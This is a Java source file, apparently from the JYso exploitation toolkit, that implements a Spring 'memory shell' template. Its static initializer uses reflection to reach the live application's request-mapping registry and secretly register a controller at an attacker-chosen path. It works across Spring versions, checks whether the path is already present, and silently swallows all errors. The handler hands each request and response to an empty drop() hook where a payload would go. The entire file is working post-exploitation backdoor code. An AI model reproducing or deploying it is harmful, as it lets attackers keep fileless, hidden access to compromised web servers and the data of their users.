package com.qi4l.JYso.template.memshellStatic.spring;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class SpringControllerMS {

    public static ClassLoader suLoader;

    public static String pattern;

    static {
        try {
            getClassLoader();
            Class<?> utilClass         = s("org.springframework.web.servlet.support.RequestContextUtils");
            Class<?> holder            = s("org.springframework.web.context.request.RequestContextHolder");
            Class<?> reqMappingHandler = s("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");

            Class<?> servletRequest     = s("javax.servlet.ServletRequest");
            Class<?> httpServletRequest = s("javax.servlet.http.HttpServletRequest");

            // 获取当前应用上下文
            Method getWebApplicationContext;
            getWebApplicationContext = getMethodByClass(utilClass, "getWebApplicationContext", new Class[]{servletRequest});
            if (getWebApplicationContext == null) {
                getWebApplicationContext = getMethodByClass(utilClass, "findWebApplicationContext", new Class[]{httpServletRequest});
            }

            getWebApplicationContext.setAccessible(true);

            // 获取 ServletRequestAttributes
            Method getAttributes = getMethodByClass(holder, "currentRequestAttributes", new Class[]{});
            getAttributes.setAccessible(true);
            Object servletRequestAttributes = getAttributes.invoke(null);

            // 通过 context 获取 RequestMappingHandlerMapping 对象
            Object mapping = getMethodAndInvoke(
                    getWebApplicationContext.invoke(null,
                            getMethodAndInvoke(servletRequestAttributes, "getRequest", new Class[]{}, new Object[]{})
                    ),
                    "getBean", new Class[]{Class.class}, new Object[]{reqMappingHandler}
            );

            // 获取父类的 MappingRegistry 属性
            Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mapping);

            // 反射调用 MappingRegistry 的 register 方法
            Class<?> c  = s("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method[] ms = c.getDeclaredMethods();

            // 判断当前路径是否已经添加
            Field lookupField;
            try {
                lookupField = c.getDeclaredField("urlLookup");
            } catch (Exception ignored) {
                lookupField = c.getDeclaredField("pathLookup");
            }
            lookupField.setAccessible(true);

            boolean flag = true;

            Map<String, Object> urlLookup = (Map<String, Object>) lookupField.get(mappingRegistry);
            for (String urlPath : urlLookup.keySet()) {
                if (pattern.equals(urlPath)) {
                    flag = false;
                    break;
                }
            }

            if (flag) {
                // 初始化一些注册需要的信息
                Boolean isSpringHigh = false;
                Object  url;
                Object  pPRC         = null;
                Class   requestConditionClass;

                // 高版本 Spring 期望使用 PathPatternsRequestCondition
                try {
                    requestConditionClass = s("org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition");

                    Class       pathPatternParserClass = s("org.springframework.web.util.pattern.PathPatternParser");
                    Constructor constructor            = requestConditionClass.getDeclaredConstructor(pathPatternParserClass, String[].class);
                    constructor.setAccessible(true);
                    pPRC = constructor.newInstance(pathPatternParserClass.newInstance(), new String[]{pattern});
                    isSpringHigh = true;
                } catch (Exception ignored) {
                }

                // 低版本使用 PatternsRequestCondition
                requestConditionClass = s("org.springframework.web.servlet.mvc.condition.PatternsRequestCondition");
                Constructor constructor = requestConditionClass.getDeclaredConstructor(String[].class);
                constructor.setAccessible(true);
                url = constructor.newInstance(new Object[]{new String[]{pattern}});

                Class<?> requestMethodsRequestCondition = s("org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition");
                Class<?> requestMappingInfo             = s("org.springframework.web.servlet.mvc.method.RequestMappingInfo");

                Class<?> params           = s("org.springframework.web.servlet.mvc.condition.ParamsRequestCondition");
                Class<?> headers          = s("org.springframework.web.servlet.mvc.condition.HeadersRequestCondition");
                Class<?> consumes         = s("org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition");
                Class<?> produces         = s("org.springframework.web.servlet.mvc.condition.ProducesRequestCondition");
                Class<?> requestCondition = s("org.springframework.web.servlet.mvc.condition.RequestCondition");

                // 实例化 RequestMethodsRequestCondition
                Constructor constructor1 = requestMethodsRequestCondition.getDeclaredConstructor(java.util.Set.class);
                constructor1.setAccessible(true);
                Object condition = constructor1.newInstance(new java.util.HashSet<Object>());

                // 实例化 RequestMappingInfo
                Constructor constructor2 = requestMappingInfo.getDeclaredConstructor(requestConditionClass, requestMethodsRequestCondition, params, headers, consumes, produces, requestCondition);
                constructor2.setAccessible(true);
                Object info = constructor2.newInstance(url, condition, null, null, null, null, null);

                if (isSpringHigh) {
                    Field field = requestMappingInfo.getDeclaredField("pathPatternsCondition");
                    field.setAccessible(true);
                    field.set(info, pPRC);
                }

                for (Method method : ms) {
                    if ("register".equals(method.getName())) {
                        // 反射调用 MappingRegistry 的 register 方法注册 SpringControllerMS 的 index
                        method.setAccessible(true);
                        method.invoke(mappingRegistry, info, SpringControllerMS.class.newInstance(),
                                SpringControllerMS.class.getDeclaredMethod("readObjectToData", new Class[]{}));
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    public static Class s(String name) throws Exception {
        return Class.forName(name, true, suLoader);
    }

    public static void getClassLoader() {
        suLoader = Thread.currentThread().getContextClassLoader();
    }

    public static java.lang.reflect.Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        java.lang.reflect.Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    public static Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            java.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null)
                return method.invoke(obj, parameters);
        } catch (Exception ignored) {
        }
        return null;
    }

    public void readObjectToData() throws Exception {
        Class<?> holder        = s("org.springframework.web.context.request.RequestContextHolder");
        Method   getAttributes = getMethodByClass(holder, "currentRequestAttributes", new Class[]{});
        getAttributes.setAccessible(true);
        Object servletRequestAttributes = getAttributes.invoke(null);
        Object request                  = getMethodAndInvoke(servletRequestAttributes, "getRequest", new Class[]{}, new Object[]{});
        Object response                 = getMethodAndInvoke(servletRequestAttributes, "getResponse", new Class[]{}, new Object[]{});
        drop(request, response);
    }

    public void drop(Object request, Object response) {

    }
}
